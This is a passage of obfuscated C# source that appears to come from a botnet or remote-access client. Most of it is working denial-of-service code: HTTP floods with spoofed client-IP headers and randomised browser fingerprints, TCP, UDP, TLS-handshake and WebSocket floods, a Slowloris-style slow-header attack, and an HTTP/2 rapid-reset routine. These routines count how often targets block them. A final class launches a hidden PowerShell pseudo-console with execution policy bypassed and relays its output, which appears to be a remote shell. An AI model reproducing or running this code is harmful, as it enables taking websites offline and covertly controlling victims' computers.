                    req.Timeout = 5000;
                    req.ReadWriteTimeout = 5000;
                    req.AllowAutoRedirect = false;
                    req.KeepAlive = true;
                    req.UserAgent = _moaFzLEIcO[_TqpHrZdNaN.Next(_moaFzLEIcO.Length)];
                    req.Accept = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp," + "*" + "/*;q=0.8";
                    req.Headers["Accept-Language"] = _TaZFBqEICtJA[_TqpHrZdNaN.Next(_TaZFBqEICtJA.Length)];
                    req.Headers["Accept-Encoding"] = "gzip, deflate, br";
                    req.Headers["Upgrade-Insecure-Requests"] = "1";
                    req.Headers["Sec-Ch-Ua"] = _rqbOmZsZWUkFab[_TqpHrZdNaN.Next(_rqbOmZsZWUkFab.Length)];
                    req.Headers["Sec-Ch-Ua-Mobile"] = "?0";
                    req.Headers["Sec-Ch-Ua-Platform"] = "\"Windows\"";
                    req.Headers["Sec-Fetch-Dest"] = "document";
                    req.Headers["Sec-Fetch-Mode"] = "navigate";
                    req.Headers["Sec-Fetch-Site"] = "none";
                    req.Headers["Sec-Fetch-User"] = "?1";
                    req.Referer = _BhYjjPMJUhGsNRs[_TqpHrZdNaN.Next(_BhYjjPMJUhGsNRs.Length)] + _yzKiDfwLovwEm(5);

                    
                    req.CookieContainer = new System.Net.CookieContainer();
                    int nc = 2 + _TqpHrZdNaN.Next(4);
                    for (int ci = 0; ci < nc; ci++)
                    {
                        try { req.CookieContainer.Add(new Uri(urlStr), new System.Net.Cookie(_gIESPhMTgABcnrgybT[_TqpHrZdNaN.Next(_gIESPhMTgABcnrgybT.Length)], _yzKiDfwLovwEm(20))); } catch { }
                    }

                    if (isCC)
                    {
                        string fakeIP = _OjXfVzqksAAm();
                        req.Headers["X-Forwarded-For"] = fakeIP;
                        req.Headers["X-Real-IP"] = fakeIP;
                        req.Headers["X-Client-IP"] = fakeIP;
                        req.Headers["CF-Connecting-IP"] = fakeIP;
                        req.Headers["Cache-Control"] = "no-cache, no-store, must-revalidate";
                        req.Headers["Pragma"] = "no-cache";
                    }

                    int sentBytes = 350;
                    if (bodyBytes != null && (method == "POST" || method == "PUT"))
                    {
                        string pad = "&_r=" + _yzKiDfwLovwEm(8) + "&_t=" + Environment.TickCount;
                        byte[] mutated = new byte[bodyBytes.Length + pad.Length];
                        Buffer.BlockCopy(bodyBytes, 0, mutated, 0, bodyBytes.Length);
                        Buffer.BlockCopy(System.Text.Encoding.ASCII.GetBytes(pad), 0, mutated, bodyBytes.Length, pad.Length);
                        req.ContentLength = mutated.Length;
                        req.ContentType = "application/x-www-form-urlencoded";
                        using (var s2 = req.GetRequestStream()) s2.Write(mutated, 0, mutated.Length);
                        sentBytes += mutated.Length;
                    }

                    using (var resp = (System.Net.HttpWebResponse)req.GetResponse())
                    {
                        using (var rs = resp.GetResponseStream())
                        {
                            byte[] buf = new byte[2048];
                            int n = rs.Read(buf, 0, buf.Length);
                            Interlocked.Add(ref bytesRecv, n + 300);

                            int sc = (int)resp.StatusCode;
                            if (sc == 403 || sc == 429 || sc == 503 || sc == 418)
                                Interlocked.Increment(ref totalBlocked);
                        }
                        Interlocked.Increment(ref totalSuccess);
                    }

                    sw.Stop();
                    Interlocked.Increment(ref totalSent);
                    Interlocked.Add(ref totalLatMs, sw.ElapsedMilliseconds);
                    Interlocked.Add(ref bytesSent, sentBytes);
                    _iwzasUjXxFLirKMuQH(ref minLat, ref maxLat, sw.ElapsedMilliseconds);
                    Interlocked.Decrement(ref activeConn);
                }
                catch (System.Net.WebException wex)
                {
                    Interlocked.Increment(ref totalSent);
                    Interlocked.Decrement(ref activeConn);
                    if (wex.Response != null)
                    {
                        try
                        {
                            var wr = (System.Net.HttpWebResponse)wex.Response;
                            int sc = (int)wr.StatusCode;
                            if (sc == 403 || sc == 429 || sc == 503 || sc == 418)
                                Interlocked.Increment(ref totalBlocked);
                            wr.Close();
                        }
                        catch { }
                        Interlocked.Increment(ref totalSuccess);
                    }
                    else
                    {
                        Interlocked.Increment(ref totalErrors);
                    }
                }
                catch
                {
                    Interlocked.Increment(ref totalSent);
                    Interlocked.Increment(ref totalErrors);
                    Interlocked.Decrement(ref activeConn);
                }
            }
        }

        
        void _JrjMxrkYAIPwlw(string urlStr, CancellationToken ct, DateTime deadline,
            ref long totalSent, ref long totalSuccess, ref long totalErrors,
            ref long totalLatMs, ref long minLat, ref long maxLat, ref long bytesSent, ref long activeConn)
        {
            Uri u; try { u = new Uri(urlStr); } catch { return; }
            string host = u.Host;
            int port = u.Port > 0 ? u.Port : (u.Scheme == "https" ? 443 : 80);
            bool isTLS = u.Scheme == "https";

            while (!ct.IsCancellationRequested && DateTime.UtcNow < deadline)
            {
                try
                {
                    Interlocked.Increment(ref activeConn);
                    var sw = System.Diagnostics.Stopwatch.StartNew();

                    var tcp = new System.Net.Sockets.TcpClient();
                    tcp.Connect(host, port);

                    System.IO.Stream stream = tcp.GetStream();
                    if (isTLS)
                    {
                        var sslStream = new System.Net.Security.SslStream(stream, false, (s, c, ch, e2) => true);
                        sslStream.AuthenticateAsClient(host);
                        stream = sslStream;
                    }

                    string httpReq = string.Format("GET /?{0} HTTP/1.1\r\nHost: {1}\r\nUser-_fCGnnZ: {2}\r\nAccept: " + "*" + "/*\r\nConnection: close\r\n\r\n",
                        _yzKiDfwLovwEm(8), host, _moaFzLEIcO[_TqpHrZdNaN.Next(_moaFzLEIcO.Length)]);
                    byte[] data = System.Text.Encoding.ASCII.GetBytes(httpReq);
                    stream.Write(data, 0, data.Length);

                    sw.Stop();
                    Interlocked.Increment(ref totalSent);
                    Interlocked.Increment(ref totalSuccess);
                    Interlocked.Add(ref totalLatMs, sw.ElapsedMilliseconds);
                    Interlocked.Add(ref bytesSent, data.Length);
                    _iwzasUjXxFLirKMuQH(ref minLat, ref maxLat, sw.ElapsedMilliseconds);

                    try { stream.Close(); } catch { }
                    try { tcp.Close(); } catch { }
                    Interlocked.Decrement(ref activeConn);
                }
                catch
                {
                    Interlocked.Increment(ref totalSent);
                    Interlocked.Increment(ref totalErrors);
                    Interlocked.Decrement(ref activeConn);
                }
            }
        }

        
        void _hmleqhhBogbsVp(string urlStr, int bodySize, CancellationToken ct, DateTime deadline,
            ref long totalSent, ref long totalSuccess, ref long totalErrors,
            ref long totalLatMs, ref long minLat, ref long maxLat, ref long bytesSent, ref long activeConn)
        {
            Uri u; try { u = new Uri(urlStr); } catch { return; }
            string host = u.Host;
            int port = u.Port > 0 ? u.Port : 80;

            int pktSize = bodySize * 1024;
            if (pktSize <= 0) pktSize = 1400;
            if (pktSize > 65507) pktSize = 65507;
            byte[] payload = new byte[pktSize];
            _TqpHrZdNaN.NextBytes(payload);

            System.Net.Sockets.UdpClient udp = null;
            try
            {
                udp = new System.Net.Sockets.UdpClient();
                udp.Connect(host, port);
                Interlocked.Increment(ref activeConn);
            }
            catch { return; }

            try
            {
                while (!ct.IsCancellationRequested && DateTime.UtcNow < deadline)
                {
                    try
                    {
                        var sw = System.Diagnostics.Stopwatch.StartNew();
                        int n = udp.Send(payload, payload.Length);
                        sw.Stop();

                        Interlocked.Increment(ref totalSent);
                        Interlocked.Increment(ref totalSuccess);
                        Interlocked.Add(ref totalLatMs, sw.ElapsedMilliseconds);
                        Interlocked.Add(ref bytesSent, n);
                        _iwzasUjXxFLirKMuQH(ref minLat, ref maxLat, sw.ElapsedMilliseconds);
                    }
                    catch
                    {
                        Interlocked.Increment(ref totalSent);
                        Interlocked.Increment(ref totalErrors);
                        try { udp.Close(); } catch { }
                        Interlocked.Decrement(ref activeConn);
                        try
                        {
                            udp = new System.Net.Sockets.UdpClient();
                            udp.Connect(host, port);
                            Interlocked.Increment(ref activeConn);
                        }
                        catch { return; }
                    }
                }
            }
            finally
            {
                try { udp.Close(); } catch { }
                Interlocked.Decrement(ref activeConn);
            }
        }

        
        void _eNXGKUsxaigHgwm(string urlStr, CancellationToken ct, DateTime deadline,
            ref long totalSent, ref long totalSuccess, ref long totalErrors,
            ref long totalLatMs, ref long minLat, ref long maxLat, ref long bytesSent, ref long activeConn)
        {
            Uri u; try { u = new Uri(urlStr); } catch { return; }
            string host = u.Host;
            int port = u.Port > 0 ? u.Port : (u.Scheme == "https" ? 443 : 80);
            bool isTLS = u.Scheme == "https";

            while (!ct.IsCancellationRequested && DateTime.UtcNow < deadline)
            {
                System.Net.Sockets.TcpClient tcp = null;
                System.IO.Stream stream = null;
                try
                {
                    Interlocked.Increment(ref activeConn);
                    var sw = System.Diagnostics.Stopwatch.StartNew();

                    tcp = new System.Net.Sockets.TcpClient();
                    tcp.Connect(host, port);

                    stream = tcp.GetStream();
                    if (isTLS)
                    {
                        var sslStream = new System.Net.Security.SslStream(stream, false, (s, c, ch, e2) => true);
                        sslStream.AuthenticateAsClient(host);
                        stream = sslStream;
                    }

                    sw.Stop();
                    Interlocked.Increment(ref totalSent);
                    Interlocked.Increment(ref totalSuccess);
                    Interlocked.Add(ref totalLatMs, sw.ElapsedMilliseconds);
                    _iwzasUjXxFLirKMuQH(ref minLat, ref maxLat, sw.ElapsedMilliseconds);

                    string header = string.Format("GET /?{0} HTTP/1.1\r\nHost: {1}\r\nUser-_fCGnnZ: {2}\r\nAccept-Language: en-US,en;q=0.5\r\n",
                        _yzKiDfwLovwEm(8), host, _moaFzLEIcO[_TqpHrZdNaN.Next(_moaFzLEIcO.Length)]);
                    byte[] hdr = System.Text.Encoding.ASCII.GetBytes(header);
                    stream.Write(hdr, 0, hdr.Length);
                    Interlocked.Add(ref bytesSent, hdr.Length);

                    for (int j = 0; j < 20 && !ct.IsCancellationRequested && DateTime.UtcNow < deadline; j++)
                    {
                        Thread.Sleep(3000);
                        string line = string.Format("X-{0}: {1}\r\n", _yzKiDfwLovwEm(6), _yzKiDfwLovwEm(12));
                        byte[] lb = System.Text.Encoding.ASCII.GetBytes(line);
                        stream.Write(lb, 0, lb.Length);
                        Interlocked.Add(ref bytesSent, lb.Length);
                    }
                }
                catch
                {
                    Interlocked.Increment(ref totalErrors);
                }
                finally
                {
                    try { if (stream != null) stream.Close(); } catch { }
                    try { if (tcp != null) tcp.Close(); } catch { }
                    Interlocked.Decrement(ref activeConn);
                }
            }
        }

        
        void _cimwXXeeQSVOWXU(string urlStr, int bodySize, CancellationToken ct, DateTime deadline,
            ref long totalSent, ref long totalSuccess, ref long totalErrors,
            ref long totalLatMs, ref long minLat, ref long maxLat, ref long bytesSent, ref long bytesRecv, ref long activeConn)
        {
            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
            ServicePointManager.DefaultConnectionLimit = 65535;
            ServicePointManager.ServerCertificateValidationCallback = (s, c, ch, e2) => true;
            ServicePointManager.Expect100Continue = false;

            int payloadSize = bodySize * 1024;
            if (payloadSize > 10 * 1024 * 1024) payloadSize = 10 * 1024 * 1024;
            if (payloadSize < 1024) payloadSize = 64 * 1024;
            byte[] payload = new byte[payloadSize];
            _TqpHrZdNaN.NextBytes(payload);

            while (!ct.IsCancellationRequested && DateTime.UtcNow < deadline)
            {
                try
                {
                    Interlocked.Increment(ref activeConn);
                    var sw = System.Diagnostics.Stopwatch.StartNew();

                    var req = (System.Net.HttpWebRequest)System.Net.WebRequest.Create(urlStr);
                    req.Method = "POST";
                    req.Timeout = 15000;
                    req.ReadWriteTimeout = 15000;
                    req.AllowAutoRedirect = false;
                    req.KeepAlive = true;
                    req.ContentType = "multipart/form-data; boundary=----WebKitFormBoundary" + _yzKiDfwLovwEm(16);
                    req.UserAgent = _moaFzLEIcO[_TqpHrZdNaN.Next(_moaFzLEIcO.Length)];
                    req.Accept = "*" + "/*";
                    req.ContentLength = payload.Length;
                    using (var s2 = req.GetRequestStream()) s2.Write(payload, 0, payload.Length);

                    using (var resp = (System.Net.HttpWebResponse)req.GetResponse())
                    {
                        using (var rs = resp.GetResponseStream())
                        {
                            byte[] buf = new byte[4096];
                            int n = rs.Read(buf, 0, buf.Length);
                            Interlocked.Add(ref bytesRecv, n + 300);
                        }
                        Interlocked.Increment(ref totalSuccess);
                    }

                    sw.Stop();
                    Interlocked.Increment(ref totalSent);
                    Interlocked.Add(ref totalLatMs, sw.ElapsedMilliseconds);
                    Interlocked.Add(ref bytesSent, payloadSize + 400);
                    _iwzasUjXxFLirKMuQH(ref minLat, ref maxLat, sw.ElapsedMilliseconds);
                    Interlocked.Decrement(ref activeConn);
                }
                catch
                {
                    Interlocked.Increment(ref totalSent);
                    Interlocked.Increment(ref totalErrors);
                    Interlocked.Decrement(ref activeConn);
                }
            }
        }

        
        void _DyyYOlFnGMOjwmCr(string urlStr, string method, string body, CancellationToken ct, DateTime deadline,
            ref long totalSent, ref long totalSuccess, ref long totalErrors, ref long totalBlocked,
            ref long totalLatMs, ref long minLat, ref long maxLat, ref long bytesSent, ref long bytesRecv, ref long activeConn)
        {
            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
            ServicePointManager.DefaultConnectionLimit = 65535;
            ServicePointManager.ServerCertificateValidationCallback = (s, c, ch, e2) => true;
            ServicePointManager.Expect100Continue = false;

            int workerType = Interlocked.Increment(ref _mNPrHMnpTaueZHfeWGIJ);
            bool freshTLS = (workerType % 2 == 0);

            if (freshTLS)
            {
                
                Uri u; try { u = new Uri(urlStr); } catch { return; }
                string host = u.Host;
                int port = u.Port > 0 ? u.Port : 443;

                while (!ct.IsCancellationRequested && DateTime.UtcNow < deadline)
                {
                    System.Net.Sockets.TcpClient tcp = null;
                    System.Net.Security.SslStream ssl = null;
                    try
                    {
                        Interlocked.Increment(ref activeConn);
                        var sw = System.Diagnostics.Stopwatch.StartNew();

                        tcp = new System.Net.Sockets.TcpClient();
                        tcp.Connect(host, port);
                        ssl = new System.Net.Security.SslStream(tcp.GetStream(), false, (s2, c2, ch2, e2) => true);
                        ssl.AuthenticateAsClient(host);

                        string httpReq = string.Format("GET /?{0} HTTP/1.1\r\nHost: {1}\r\nUser-_fCGnnZ: {2}\r\nAccept: " + "*" + "/*\r\nConnection: close\r\n\r\n",
                            _yzKiDfwLovwEm(8), host, _moaFzLEIcO[_TqpHrZdNaN.Next(_moaFzLEIcO.Length)]);
                        byte[] data = System.Text.Encoding.ASCII.GetBytes(httpReq);
                        ssl.Write(data, 0, data.Length);

                        sw.Stop();
                        Interlocked.Increment(ref totalSent);
                        Interlocked.Increment(ref totalSuccess);
                        Interlocked.Add(ref totalLatMs, sw.ElapsedMilliseconds);
                        Interlocked.Add(ref bytesSent, data.Length);
                        _iwzasUjXxFLirKMuQH(ref minLat, ref maxLat, sw.ElapsedMilliseconds);
                        Interlocked.Decrement(ref activeConn);
                    }
                    catch
                    {
                        Interlocked.Increment(ref totalSent);
                        Interlocked.Increment(ref totalErrors);
                        Interlocked.Decrement(ref activeConn);
                    }
                    finally
                    {
                        try { if (ssl != null) ssl.Close(); } catch { }
                        try { if (tcp != null) tcp.Close(); } catch { }
                    }
                }
            }
            else
            {
                
                _gJRexyNkIIzaHni(urlStr, method, body, false, ct, deadline,
                    ref totalSent, ref totalSuccess, ref totalErrors, ref totalBlocked,
                    ref totalLatMs, ref minLat, ref maxLat, ref bytesSent, ref bytesRecv, ref activeConn);
            }
        }
        static int _mNPrHMnpTaueZHfeWGIJ;

        
        
        void _bonCyZqtEHQzW(string urlStr, CancellationToken ct, DateTime deadline,
            ref long totalSent, ref long totalSuccess, ref long totalErrors,
            ref long totalLatMs, ref long minLat, ref long maxLat, ref long bytesSent, ref long activeConn)
        {
            Uri u; try { u = new Uri(urlStr); } catch { return; }
            string host = u.Host;
            int port = u.Port > 0 ? u.Port : (u.Scheme == "https" ? 443 : 80);
            bool isTLS = u.Scheme == "https";
            string path = string.IsNullOrEmpty(u.PathAndQuery) ? "/" : u.PathAndQuery;

            while (!ct.IsCancellationRequested && DateTime.UtcNow < deadline)
            {
                System.Net.Sockets.TcpClient tcp = null;
                System.IO.Stream stream = null;
                try
                {
                    tcp = new System.Net.Sockets.TcpClient();
                    tcp.Connect(host, port);
                    stream = tcp.GetStream();

                    if (isTLS)
                    {
                        var ssl = new System.Net.Security.SslStream(stream, false, (s, c, ch, e2) => true);
                        ssl.AuthenticateAsClient(host, null, System.Security.Authentication.SslProtocols.Tls12, false);
                        stream = ssl;
                    }

                    Interlocked.Increment(ref activeConn);

                    
                    byte[] preface = System.Text.Encoding.ASCII.GetBytes("PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n");
                    stream.Write(preface, 0, preface.Length);

                    
                    
                    byte[] settingsPayload = new byte[] {
                        0x00, 0x04, 0x00, 0x00, 0xFF, 0xFF, 
                        0x00, 0x05, 0x00, 0x00, 0x40, 0x00  
                    };
                    _PWLAscCcUDVO(stream, 0x04, 0x00, 0, settingsPayload);

                    
                    byte[] winUpdate = new byte[4];
                    winUpdate[0] = 0x00; winUpdate[1] = 0x10; winUpdate[2] = 0x00; winUpdate[3] = 0x00; 
                    _PWLAscCcUDVO(stream, 0x08, 0x00, 0, winUpdate);

                    uint streamID = 1;
                    var connStart = DateTime.UtcNow;

                    
                    for (int j = 0; j < 5000; j++)
                    {
                        if (ct.IsCancellationRequested || DateTime.UtcNow > deadline) break;
                        if ((DateTime.UtcNow - connStart).TotalSeconds > 10) break;

                        var sw = System.Diagnostics.Stopwatch.StartNew();

                        
                        string reqPath = path;
                        if (_PuhqJephyQsB.Length > 0 && _TqpHrZdNaN.Next(3) == 0)
                            reqPath = _PuhqJephyQsB[_TqpHrZdNaN.Next(_PuhqJephyQsB.Length)] + "?" + _yzKiDfwLovwEm(6);

                        byte[] headers = _FdqfxtWyZsyFZq(u.Scheme, host, reqPath);
                        _PWLAscCcUDVO(stream, 0x01, 0x05, streamID, headers);

                        
                        byte[] rstPayload = new byte[] { 0x00, 0x00, 0x00, 0x08 };
                        _PWLAscCcUDVO(stream, 0x03, 0x00, streamID, rstPayload);

                        sw.Stop();
                        Interlocked.Increment(ref totalSent);
                        Interlocked.Increment(ref totalSuccess);
                        Interlocked.Add(ref totalLatMs, sw.ElapsedMilliseconds);
                        Interlocked.Add(ref bytesSent, headers.Length + 27);
                        _iwzasUjXxFLirKMuQH(ref minLat, ref maxLat, sw.ElapsedMilliseconds);

                        streamID += 2;
                        if (streamID > 2147483647) break;
                    }

                    Interlocked.Decrement(ref activeConn);
                }
                catch
                {
                    Interlocked.Increment(ref totalErrors);
                    Interlocked.Increment(ref totalSent);
                    try { Interlocked.Decrement(ref activeConn); } catch { }
                }
                finally
                {
                    try { if (stream != null) stream.Close(); } catch { }
                    try { if (tcp != null) tcp.Close(); } catch { }
                }
            }
        }

        static void _PWLAscCcUDVO(System.IO.Stream s, byte type, byte flags, uint streamID, byte[] payload)
        {
            int len = payload != null ? payload.Length : 0;
            byte[] header = new byte[9];
            header[0] = (byte)((len >> 16) & 0xFF);
            header[1] = (byte)((len >> 8) & 0xFF);
            header[2] = (byte)(len & 0xFF);
            header[3] = type;
            header[4] = flags;
            header[5] = (byte)((streamID >> 24) & 0x7F);
            header[6] = (byte)((streamID >> 16) & 0xFF);
            header[7] = (byte)((streamID >> 8) & 0xFF);
            header[8] = (byte)(streamID & 0xFF);
            s.Write(header, 0, 9);
            if (payload != null && len > 0)
                s.Write(payload, 0, len);
        }

        
        static byte[] _FdqfxtWyZsyFZq(string scheme, string host, string path)
        {
            var buf = new System.IO.MemoryStream();
            
            buf.WriteByte(0x82);
            
            buf.WriteByte((byte)(scheme == "https" ? 0x87 : 0x86));
            
            buf.WriteByte(0x44);
            _pUwISVFNevZLCMjJ(buf, path);
            
            buf.WriteByte(0x41);
            _pUwISVFNevZLCMjJ(buf, host);
            
            buf.WriteByte(0x40);
            _pUwISVFNevZLCMjJ(buf, "user-agent");
            _pUwISVFNevZLCMjJ(buf, _moaFzLEIcO[_TqpHrZdNaN.Next(_moaFzLEIcO.Length)]);
            
            buf.WriteByte(0x40);
            _pUwISVFNevZLCMjJ(buf, "accept");
            _pUwISVFNevZLCMjJ(buf, "*" + "/*");
            return buf.ToArray();
        }

        static void _pUwISVFNevZLCMjJ(System.IO.MemoryStream buf, string val)
        {
            byte[] b = System.Text.Encoding.ASCII.GetBytes(val);
            if (b.Length < 127)
            {
                buf.WriteByte((byte)b.Length);
            }
            else
            {
                buf.WriteByte(0x7F);
                int rem = b.Length - 127;
                while (rem >= 128) { buf.WriteByte((byte)(0x80 | (rem & 0x7F))); rem >>= 7; }
                buf.WriteByte((byte)rem);
            }
            buf.Write(b, 0, b.Length);
        }

        
        void _zyvDFgCDheGZP(string urlStr, int bodySize, CancellationToken ct, DateTime deadline,
            ref long totalSent, ref long totalSuccess, ref long totalErrors,
            ref long totalLatMs, ref long minLat, ref long maxLat, ref long bytesSent, ref long activeConn)
        {
            Uri u; try { u = new Uri(urlStr); } catch { return; }
            string wsScheme = u.Scheme == "https" ? "wss" : "ws";
            string wsUrl = wsScheme + "://" + u.Host + (u.Port > 0 ? ":" + u.Port : "") + u.PathAndQuery;

            int msgSize = bodySize > 0 ? bodySize : 1;
            if (msgSize > 64) msgSize = 64;
            byte[] msg = new byte[msgSize * 1024];
            _TqpHrZdNaN.NextBytes(msg);

            while (!ct.IsCancellationRequested && DateTime.UtcNow < deadline)
            {
                System.Net.WebSockets.ClientWebSocket ws = null;
                try
                {
                    var sw = System.Diagnostics.Stopwatch.StartNew();
                    ws = new System.Net.WebSockets.ClientWebSocket();
                    ws.Options.SetRequestHeader("User-_fCGnnZ", _moaFzLEIcO[_TqpHrZdNaN.Next(_moaFzLEIcO.Length)]);
                    ws.Options.SetRequestHeader("Origin", u.Scheme + "://" + u.Host);

                    var connectCts = CancellationTokenSource.CreateLinkedTokenSource(ct);
                    connectCts.CancelAfter(5000);
                    ws.ConnectAsync(new Uri(wsUrl), connectCts.Token).Wait();

                    sw.Stop();
                    Interlocked.Increment(ref activeConn);
                    Interlocked.Increment(ref totalSent);
                    Interlocked.Increment(ref totalSuccess);
                    Interlocked.Add(ref totalLatMs, sw.ElapsedMilliseconds);
                    Interlocked.Add(ref bytesSent, 300);
                    _iwzasUjXxFLirKMuQH(ref minLat, ref maxLat, sw.ElapsedMilliseconds);

                    
                    for (int k = 0; k < 100 && !ct.IsCancellationRequested && DateTime.UtcNow < deadline; k++)
                    {
                        if (ws.State != System.Net.WebSockets.WebSocketState.Open) break;
                        var sendCts = CancellationTokenSource.CreateLinkedTokenSource(ct);
                        sendCts.CancelAfter(3000);
                        ws.SendAsync(new ArraySegment<byte>(msg), System.Net.WebSockets.WebSocketMessageType.Binary, true, sendCts.Token).Wait();
                        Interlocked.Increment(ref totalSent);
                        Interlocked.Increment(ref totalSuccess);
                        Interlocked.Add(ref bytesSent, msg.Length);
                        Thread.Sleep(50 + _TqpHrZdNaN.Next(100));
                    }

                    Interlocked.Decrement(ref activeConn);
                }
                catch
                {
                    Interlocked.Increment(ref totalErrors);
                    Interlocked.Increment(ref totalSent);
                    try { Interlocked.Decrement(ref activeConn); } catch { }
                }
                finally
                {
                    try { if (ws != null) ws.Dispose(); } catch { }
                }
            }
        }

        static void _iwzasUjXxFLirKMuQH(ref long minLat, ref long maxLat, long val)
        {
            long cur;
            do { cur = Interlocked.Read(ref minLat); } while (val < cur && Interlocked.CompareExchange(ref minLat, val, cur) != cur);
            do { cur = Interlocked.Read(ref maxLat); } while (val > cur && Interlocked.CompareExchange(ref maxLat, val, cur) != cur);
        }
    }

    
    
    
    internal class _ljnXSROthf : IDisposable
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern int CreatePseudoConsole(ConPTY_COORD size, IntPtr hInput, IntPtr hOutput, uint dwFlags, out IntPtr phPC);
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern int ResizePseudoConsole(IntPtr hPC, ConPTY_COORD size);
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern void ClosePseudoConsole(IntPtr hPC);
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool CreatePipe(out IntPtr hReadPipe, out IntPtr hWritePipe, ref ConPTY_SA sa, uint nSize);
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool ReadFile(IntPtr hFile, byte[] buf, int nBytesToRead, out int nBytesRead, IntPtr overlapped);
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool WriteFile(IntPtr hFile, byte[] buf, int nBytesToWrite, out int nBytesWritten, IntPtr overlapped);
        [DllImport("kernel32.dll")] static extern bool CloseHandle(IntPtr h);
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool InitializeProcThreadAttributeList(IntPtr lpAttrList, int dwAttrCount, int dwFlags, ref IntPtr lpSize);
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool UpdateProcThreadAttribute(IntPtr lpAttrList, uint dwFlags, IntPtr attr, IntPtr lpValue, IntPtr cbSize, IntPtr lpPrev, IntPtr lpRetSz);
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern void DeleteProcThreadAttributeList(IntPtr lpAttrList);
        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        static extern bool CreateProcessW(string lpApp, string lpCmd, IntPtr lpProcAttr, IntPtr lpThreadAttr,
            bool bInheritHandles, uint dwFlags, IntPtr lpEnv, string lpCwd, ref ConPTY_SIEX lpSI, out ConPTY_PI lpPI);
        [DllImport("kernel32.dll")] static extern uint WaitForSingleObject(IntPtr h, uint ms);
        [DllImport("kernel32.dll")] static extern bool GetExitCodeProcess(IntPtr h, out uint code);
        [DllImport("kernel32.dll")] static extern bool TerminateProcess(IntPtr h, uint code);

        [StructLayout(LayoutKind.Sequential)] struct ConPTY_COORD { public short X, Y; }
        [StructLayout(LayoutKind.Sequential)] struct ConPTY_SA { public int nLength; public IntPtr lpSD; public bool bInheritHandle; }
        [StructLayout(LayoutKind.Sequential)] struct ConPTY_SI
        {
            public int cb; public IntPtr lpReserved, lpDesktop, lpTitle;
            public int dwX, dwY, dwXSize, dwYSize, dwXCountChars, dwYCountChars, dwFillAttribute, dwFlags;
            public short wShowWindow, cbReserved2; public IntPtr lpReserved2, hStdInput, hStdOutput, hStdError;
        }
        [StructLayout(LayoutKind.Sequential)] struct ConPTY_SIEX { public ConPTY_SI StartupInfo; public IntPtr lpAttributeList; }
        [StructLayout(LayoutKind.Sequential)] struct ConPTY_PI { public IntPtr hProcess, hThread; public int dwProcessId, dwThreadId; }

        const uint EXTENDED_STARTUPINFO_PRESENT = 0x00080000;
        static readonly IntPtr PROC_THREAD_ATTRIBUTE_PSEUDOCONSOLE = (IntPtr)0x00020016;

        readonly string _id;
        readonly Action<string> _WBvgCIovL;
        readonly Action<int> _MsAsXBG;
        IntPtr _hPC, _hProcess, _inputWriteHandle, _outputReadHandle;
        volatile bool _BcYGryqBv;

        public _ljnXSROthf(string id, Action<string> onOutput, Action<int> onExit)
        {
            _id = id; _WBvgCIovL = onOutput; _MsAsXBG = onExit;
        }

        public void Start() { Start(120, 30); }
        public void Start(int cols, int rows)
        {
            IntPtr inputReadHandle, outputWriteHandle;
            var sa = new ConPTY_SA { nLength = Marshal.SizeOf(typeof(ConPTY_SA)), bInheritHandle = true };
            if (!CreatePipe(out inputReadHandle, out _inputWriteHandle, ref sa, 0))
                throw new Exception("CreatePipe(input) failed: " + Marshal.GetLastWin32Error());
            if (!CreatePipe(out _outputReadHandle, out outputWriteHandle, ref sa, 0))
                throw new Exception("CreatePipe(output) failed: " + Marshal.GetLastWin32Error());

            var size = new ConPTY_COORD { X = (short)cols, Y = (short)rows };
            int hr = CreatePseudoConsole(size, inputReadHandle, outputWriteHandle, 0, out _hPC);
            if (hr != 0) throw new Exception("CreatePseudoConsole failed: 0x" + hr.ToString("X"));

            CloseHandle(inputReadHandle);
            CloseHandle(outputWriteHandle);

            var si = new ConPTY_SIEX();
            si.StartupInfo.cb = Marshal.SizeOf(typeof(ConPTY_SIEX));
            IntPtr attrSz = IntPtr.Zero;
            InitializeProcThreadAttributeList(IntPtr.Zero, 1, 0, ref attrSz);
            si.lpAttributeList = Marshal.AllocHGlobal(attrSz.ToInt32());
            if (!InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, ref attrSz))
                throw new Exception("InitializeProcThreadAttributeList failed");
            if (!UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PSEUDOCONSOLE,
                    _hPC, (IntPtr)IntPtr.Size, IntPtr.Zero, IntPtr.Zero))
                throw new Exception("UpdateProcThreadAttribute failed: " + Marshal.GetLastWin32Error());

            ConPTY_PI pi;
            string cmd = "powershell.exe -NoLogo -NoProfile -ExecutionPolicy Bypass";
            if (!CreateProcessW(null, cmd, IntPtr.Zero, IntPtr.Zero, false,
                    EXTENDED_STARTUPINFO_PRESENT, IntPtr.Zero, null, ref si, out pi))
                throw new Exception("CreateProcess failed: " + Marshal.GetLastWin32Error());

            _hProcess = pi.hProcess;
            CloseHandle(pi.hThread);
            DeleteProcThreadAttributeList(si.lpAttributeList);
            Marshal.FreeHGlobal(si.lpAttributeList);

            ThreadPool.QueueUserWorkItem(_ => ReadLoop());
            ThreadPool.QueueUserWorkItem(_ => WaitForExit());

            
            ThreadPool.QueueUserWorkItem(_ => {
                Thread.Sleep(1000);
                if (!_BcYGryqBv) _CmsCNTGoha("Remove-Module PSReadLine -Force -EA SilentlyContinue; cls\r");
            });
        }

        void ReadLoop()
        {
            var buf = new byte[4096];
            try
            {
                while (!_BcYGryqBv)
                {
                    int n;
                    if (!ReadFile(_outputReadHandle, buf, buf.Length, out n, IntPtr.Zero) || n <= 0) break;
                    
                    var text = Encoding.UTF8.GetString(buf, 0, n);
                    if (!_BcYGryqBv) _WBvgCIovL(text);
                }
            }
            catch { }
        }

        void WaitForExit()
        {
            WaitForSingleObject(_hProcess, 0xFFFFFFFF);
            uint code; GetExitCodeProcess(_hProcess, out code);
